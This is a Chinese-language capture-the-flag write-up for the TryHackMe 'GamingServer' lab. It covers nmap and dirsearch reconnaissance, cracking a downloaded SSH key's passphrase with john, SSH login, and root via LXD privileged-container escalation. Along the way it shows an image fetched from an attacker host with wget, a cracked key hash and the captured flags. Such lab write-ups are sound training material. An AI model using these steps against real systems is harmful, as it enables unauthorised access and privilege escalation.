#服务发现
```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.77.110    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 06:09 EDT
Nmap scan report for 10.10.77.110
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
```

#目录扫描
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u http://10.10.78.156

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-26_22-15-41.log

Target: http://10.10.78.156

[22:15:41] Starting: 
[22:15:43] 200 -    3KB - /
[22:15:45] 301 -  314B  - /uploads  ->  http://10.10.78.156/uploads/
[22:16:05] 301 -  313B  - /secret  ->  http://10.10.78.156/secret/
[22:21:29] 403 -  277B  - /server-status      
```

#在/uploads/页面找到一个字典文件dict.lst
下载下来：```wget http://10.10.77.110/uploads/dict.lst```


#在/secret/找到ssh的私钥文件
下载到本地备用:```wget http://10.10.77.110/secret/secretKey```

#用john破解上面的私钥
```
┌──(root💀kali)-[~/tryhackme/GamingServer]
└─# locate ssh2john.py
/usr/share/john/ssh2john.py
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/GamingServer]
└─# /usr/share/john/ssh2john.py secretKey >crack
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/GamingServer]
└─# cat crack    
secretKey:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b757aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/GamingServer]
└─# john crack --wordlist=/root/tryhackme/GamingServer/dict.lst                                                                                                                                                                       130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
1g 0:00:00:00 DONE (2021-09-26 06:26) 100.0g/s 22200p/s 22200c/s 22200C/s 2003..starwars
Session completed

```

密码是：```letmein```

用户名是什么？

我们在首页源代码看到这样一行注释：
```
john, please add some actual content to the site! lorem ipsum is horrible to look at.
```

所以john是一个开发人员，我们用```john```做用户名，```letmein```作为密码登陆远程ssh
```
┌──(root💀kali)-[~/tryhackme/GamingServer]
└─# ssh -i id_rsa john@10.10.78.156
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 27 02:31:31 UTC 2021

  System load:  0.01              Processes:           98
  Usage of /:   41.4% of 9.78GB   Users logged in:     0
  Memory usage: 20%               IP address for eth0: 10.10.78.156
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Sep 27 02:31:18 2021 from 10.13.21.169
john@exploitable:~$ pwd
/home/john
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```


成功拿到user.txt


传linpea，发现可以用lxd提权

#什么是lxd

>LXD着重在于系统容器，也叫基础设施容器。 即一个LXD容器上运行了一个完整的Linux系统，和它跑在物理机或者虚拟机上面时几乎一模一样。 这些容器基于一个干净的发行版镜像，长期运行。 传统的配置管理和部署工具都可以和LXD容器一起使用，这和你在虚拟机、云实例或者物理机上面使用时一样


#如何利用lxd提升系统权限

参考linpea给出的[这篇文章](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)



我们首先在 攻击机把容器下载到本地，并且编译成一个镜像文件
```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

然后用python开启一个http服务，把镜像文件传到靶机

```
john@exploitable:/tmp$ wget http://10.13.21.169:8000/alpine-v3.8-i686-20210926_2341.tar.gz
--2021-09-27 03:57:58--  http://10.13.21.169:8000/alpine-v3.8-i686-20210926_2341.tar.gz
Connecting to 10.13.21.169:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2684439 (2.6M) [application/gzip]
Saving to: ‘alpine-v3.8-i686-20210926_2341.tar.gz’

alpine-v3.8-i686-20210926_2341.tar.gz                      100%[========================================================================================================================================>]   2.56M   624KB/s    in 4.2s    

2021-09-27 03:58:03 (624 KB/s) - ‘alpine-v3.8-i686-20210926_2341.tar.gz’ saved [2684439/2684439]
```

创建一个容器，并且把靶机根目录挂载到/mnt/root下

```
john@exploitable:/tmp$ lxc image import ./alpine-v3.8-i686-20210926_2341.tar.gz --alias myimage
Image imported with fingerprint: a4b76201ae71d9a5e56acf1263f61546a77a4086779729bb254d47cd24cb6829
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
```

进入容器，这样我们就可以在容器的/mnt/root下访问到靶机目录
```
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/
/mnt/root # ls
bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            swap.img        tmp             var             vmlinuz.old
boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             sys             usr             vmlinuz
/mnt/root # cd root/
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
/mnt/root/root # 
```
